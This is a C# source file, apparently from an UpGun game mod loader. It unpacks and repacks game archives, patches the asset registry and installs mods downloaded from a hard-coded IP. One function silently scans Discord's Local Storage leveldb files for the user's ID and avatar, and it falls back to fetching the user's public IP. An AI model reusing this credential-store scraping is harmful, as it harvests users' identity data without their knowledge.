using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using QueenIO;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class Fonctions
{
	private static string version = "1.0";

    private static string CurrentGameVersion = UpGunFinder.GetInstalledVersion();

    public static string UpGunPath = UpGunFinder.GetUpGunPaksPath();

	public static string appdatapath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming";

	public static string appdatapath2 = appdatapath + "\\UpGunMods";

    private static readonly string GameVersionFile =
    !string.IsNullOrWhiteSpace(appdatapath2)
        ? Path.Combine(appdatapath2, "gameversion.txt")
        : Path.Combine(Environment.CurrentDirectory, "gameversion.txt");

    private static string appdatapath3 = appdatapath2 + "\\Mods";

	public static string appdatapath4 = appdatapath2 + "\\MyUploadedMods\\MyMods.txt";

	public static string appdatapath5 = appdatapath2 + "\\MyUploadedMods\\Username.txt";

	private static string path2 = appdatapath2 + "\\repak.exe";

	private static string AESKey = ""; // AES

    private static string ARPath = UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\AssetRegistry.bin";

	private static string ARPath2 = UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\Content";

	public static string PakGameFilePath = UpGunPath + "\\UpGun-WindowsNoEditor.pak";

	public static string PakModsSupportFilePath = UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry.pak";

    public static async Task CheckLoaderUpdate()
    {
        string token = ""; // GITHUB TOKEN
        string url = "https://api.github.com/repos/XorcodeYt/UpGunLoader/releases";

        using (HttpClient httpClient = new HttpClient())
        {
            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("UpGunModLoader/1.0");
            httpClient.DefaultRequestHeaders.Accept.Add(
                new MediaTypeWithQualityHeaderValue("application/vnd.github+json"));
            httpClient.DefaultRequestHeaders.Authorization =
                new AuthenticationHeaderValue("token", token);

            HttpResponseMessage response = await httpClient.GetAsync(url);
            if (!response.IsSuccessStatusCode)
            {
                MessageBox.Show(
                    "Unable to check for updates.\nPlease try again later.",
                    "Update Check Failed",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            string json = await response.Content.ReadAsStringAsync();
            JArray releases = JArray.Parse(json);

            if (releases.Count == 0)
            {
                MessageBox.Show(
                    "No releases were found on the update server.",
                    "Update Check Failed",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            JObject latest = (JObject)releases[0];
            string latestName = latest["name"]?.ToString() ?? "inconnu";
            string latestTag = latest["tag_name"]?.ToString() ?? "inconnu";

            if (!string.Equals(latestName.TrimStart('v', 'V'), version, StringComparison.OrdinalIgnoreCase))
            {
                MessageBox.Show(
                    $"A new version is available: {latestName}\n" +
                    $"Current version: V{version}\n\n" +
                    "Please update your application to the latest version.",
                    "Update Required",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
        }
    }

    public static void SavePath()
    {
        File.WriteAllText(Path.Combine(appdatapath2, "gamepath.txt"), UpGunPath);
    }


    public static void CleanUpGunFolder()
    {
        var filesToKeep = new HashSet<string>
    {
        "UpGun-WindowsNoEditor.pak",
        "UpGun-WindowsNoEditor.sig"
    };

        foreach (var file in Directory.GetFiles(UpGunPath))
        {
            var fileName = Path.GetFileName(file);

            if (!filesToKeep.Contains(fileName))
            {
                File.Delete(file);
            }
        }

        foreach (var dir in Directory.GetDirectories(UpGunPath))
        {
            Directory.Delete(dir, true);
        }
    }

    public static void DeleteMod(string ModName)
    {
        using (SplashManager.Scope("Deleting mod"))
        {
            File.Delete(UpGunPath + "\\" + ModName + ".pak");
            File.Delete(UpGunPath + "\\" + ModName + ".sig");

            if (Directory.Exists(appdatapath3 + "\\" + ModName))
            {
                SplashManager.Update("Cleaning local mod folder");
                Directory.Delete(appdatapath3 + "\\" + ModName, recursive: true);

                SplashManager.Update("Resetting AssetRegistry");
                ResetBinFile();

                SplashManager.Update("Reinstalling all mods");
                ReinstallAllMods();

                SplashManager.Update("Repacking AssetRegistry");
                RepakTheNewBinFile();
            }
        }
    }

    public static void CreateSig(string pakname)
    {
        string originalSig = Path.Combine(Path.GetDirectoryName(PakGameFilePath), "UpGun-WindowsNoEditor.sig");

        string newSig = Path.Combine(Path.GetDirectoryName(PakGameFilePath), pakname + ".sig");

        if (!File.Exists(originalSig))
        {
            throw new FileNotFoundException("Le fichier .sig original est introuvable", originalSig);
        }

        File.Copy(originalSig, newSig, overwrite: true);
    }


    public static void InstallMod(string URL, string Name)
    {
        using (SplashManager.Scope("Downloading mod"))
        {
            string text = appdatapath3 + "\\" + Name;

            new WebClient().DownloadFile(URL, text + ".zip");
            Thread.Sleep(200);

            SplashManager.Update("Extracting files");
            if (Directory.Exists(text))
            {
                Directory.Delete(text, recursive: true);
            }
            ZipFile.ExtractToDirectory(text + ".zip", appdatapath3);

            SplashManager.Update("Moving .pak to UpGun folder");
            File.Delete(text + ".zip");
            File.Move(text + ".pak", UpGunPath + "\\" + Name + ".pak");
			CreateSig(Name);

            if (Directory.Exists(text))
            {
                SplashManager.Update("Injecting JSON code");
                InjectJsonCode(text);

                SplashManager.Update("Repacking AssetRegistry");
                RepakTheNewBinFile();
            }
        }
    }


    public static void InjectJsonCode(string FolderJsonToInject)
	{
		try
		{
			AssetRegistry assetRegistry = new AssetRegistry();
			assetRegistry.Read(File.ReadAllBytes(ARPath));
			string[] files = Directory.GetFiles(FolderJsonToInject, "*.json");
			for (int i = 0; i < files.Length; i++)
			{
				AssetRegistry.FAssetData item = JsonConvert.DeserializeObject<AssetRegistry.FAssetData>(File.ReadAllText(files[i]));
				assetRegistry.fAssetDatas.Add(item);
			}
			File.WriteAllBytes(ARPath, assetRegistry.Make());
		}
		catch
		{
			MessageBox.Show("Une erreur s'est produite!");
		}
	}

	public static void ReinstallAllMods()
	{
		if (Directory.Exists(appdatapath3))
		{
			string[] directories = Directory.GetDirectories(appdatapath3);
			for (int i = 0; i < directories.Length; i++)
			{
				InjectJsonCode(directories[i]);
			}
		}
	}

	public static bool CheckIfModSupportInstalled()
	{
		if (!File.Exists(PakModsSupportFilePath))
		{
            SavePath();
            InstallModsSupport();
			return false;
		}
		return true;
	}

    public static bool CheckGameUpdates()
    {
        if (string.IsNullOrEmpty(CurrentGameVersion))
        {
            MessageBox.Show(
                "No installed game version was found.\n" +
                "Update checks and mod support cannot be performed.",
                "Version Not Found",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning);
            return false;
        }

        if (!File.Exists(GameVersionFile))
        {
            MessageBox.Show(
                "The game version file could not be found.\n" +
                "Cannot check or apply updates.",
                "Mod support will be reinstalled",
                MessageBoxButtons.OK,
                MessageBoxIcon.Error);
            CleanUpGunFolder();
            InstallModsSupport();
            return false;
        }

        string version = File.ReadAllText(GameVersionFile)?.Trim();
        if (string.IsNullOrEmpty(version))
        {
            MessageBox.Show(
                "The game version file is empty or unreadable.\n" +
                "Cannot check or apply updates.",
                "Mod support will be reinstalled",
                MessageBoxButtons.OK,
                MessageBoxIcon.Error);
            CleanUpGunFolder();
            InstallModsSupport();
            return false;
        }

        if (!version.Equals(CurrentGameVersion, StringComparison.OrdinalIgnoreCase))
        {
            MessageBox.Show(
                $"Mod support outdated !\n" +
                $"Mod support version: {version}\n" +
                $"Game version version: {CurrentGameVersion}",
                "Mod support will update all mods will be wipped",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information);
            CleanUpGunFolder();
            InstallModsSupport();
            return true;
        }
        return false;
    }


    static void CopyDirectory(string sourceDir, string destDir, bool recursive)
    {
        Directory.CreateDirectory(destDir);

        foreach (string file in Directory.GetFiles(sourceDir))
        {
            string targetFilePath = Path.Combine(destDir, Path.GetFileName(file));
            File.Copy(file, targetFilePath, overwrite: true);
        }

        if (recursive)
        {
            foreach (string directory in Directory.GetDirectories(sourceDir))
            {
                string targetDirectoryPath = Path.Combine(destDir, Path.GetFileName(directory));
                CopyDirectory(directory, targetDirectoryPath, recursive);
            }
        }
    }

    public static void InstallModsSupport()
    {
        using (SplashManager.Scope("Installation of the mods support"))
        {
            if (Process.GetProcessesByName("UpGun-Win64-Shipping").Length != 0)
            {
                SplashManager.Update("Closing UpGun");
                ExecuteCmdCommand("taskkill /f /im UpGun-Win64-Shipping.exe");
            }

            Thread.Sleep(300);

            string quotedPath2 = $"\"{path2}\"";

            SplashManager.Update("Unpacking base game pak");
            ExecuteCmdCommand($"{quotedPath2} --aes-key {AESKey} unpack \"{PakGameFilePath}\"");

            SplashManager.Update("Moving AssetRegistry.bin");
            Directory.CreateDirectory(UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun");
			File.Move(UpGunPath + "\\UpGun-WindowsNoEditor\\UpGun\\AssetRegistry.bin", ARPath);

            SplashManager.Update("Adapting game files");
            CopyDirectory(appdatapath2 + "\\Content", ARPath2, true);

            SplashManager.Update("Repacking game content");
            ExecuteCmdCommand($"{quotedPath2} pack \"{UpGunPath}\\UpGun-WindowsNoEditor_AssetRegistry\"");
			CreateSig("UpGun-WindowsNoEditor_AssetRegistry");

            SplashManager.Update("Cleaning & backup");
            Directory.Delete(UpGunPath + "\\UpGun-WindowsNoEditor", recursive: true);
            File.Copy(ARPath, UpGunPath + "\\AssetRegistry.bak");

            File.WriteAllText(GameVersionFile, CurrentGameVersion);
        }

    }



    public static void RepakTheNewBinFile()
	{
        string quotedPath2 = $"\"{path2}\"";
        File.Delete(UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
		ExecuteCmdCommand($"{quotedPath2} pack \"" + UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
	}

	public static void ResetBinFile()
	{
        string quotedPath2 = $"\"{path2}\"";
        File.Delete(UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
		File.Delete(UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\AssetRegistry.bin");
		File.Copy(UpGunPath + "\\AssetRegistry.bak", ARPath);
		ExecuteCmdCommand($"{quotedPath2} pack \"" + UpGunPath + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
	}

    public static void ExecuteCmdCommand(string cmdCommand)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			RedirectStandardInput = true,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		process.Start();
		process.StandardInput.WriteLine("cd " + UpGunPath);
		process.StandardInput.WriteLine(cmdCommand);
		process.StandardInput.Flush();
		process.StandardInput.Close();
		process.WaitForExit();
		process.Close();
	}

	public static async Task<string> GetUploadedMods()
	{
		string text = "http://144.24.205.218:8000/file/mods.txt";
		HttpClient httpClient = new HttpClient();
		try
		{
			HttpResponseMessage val = await httpClient.GetAsync(text);
			if (val.IsSuccessStatusCode)
			{
				return (await val.Content.ReadAsStringAsync()).ToString();
			}
		}
		finally
		{
			((IDisposable)httpClient)?.Dispose();
		}
		return null;
	}

	public static string[] GetDiscordUserIdAndAvatar()
	{
		string[] array = new string[3] { "discord", "discordcanary", "discordptb" };
		for (int i = 0; i < array.Length; i++)
		{
			if (!Directory.Exists(Path.Combine(appdatapath, array[i])))
			{
				continue;
			}
			string[] files = Directory.GetFiles(Path.Combine(appdatapath, array[i], "Local Storage", "leveldb"), "*.ldb");
			for (int j = 0; j < files.Length; j++)
			{
				StreamReader streamReader = new StreamReader(files[j]);
				string pattern = "{\"_state\":{\"users\":\\[{\"id\":\"(.*?)\",\"avatar\":\"(.*?)\"";
				Match match = Regex.Match(streamReader.ReadToEnd(), pattern);
				if (match.Success)
				{
					return new string[2]
					{
						match.Groups[1].Value,
						match.Groups[2].Value
					};
				}
			}
		}
		JObject jObject = JObject.Parse(new WebClient().DownloadString("https://httpbin.org/ip"));
		return new string[2]
		{
			jObject["origin"].ToString(),
			""
		};
	}
}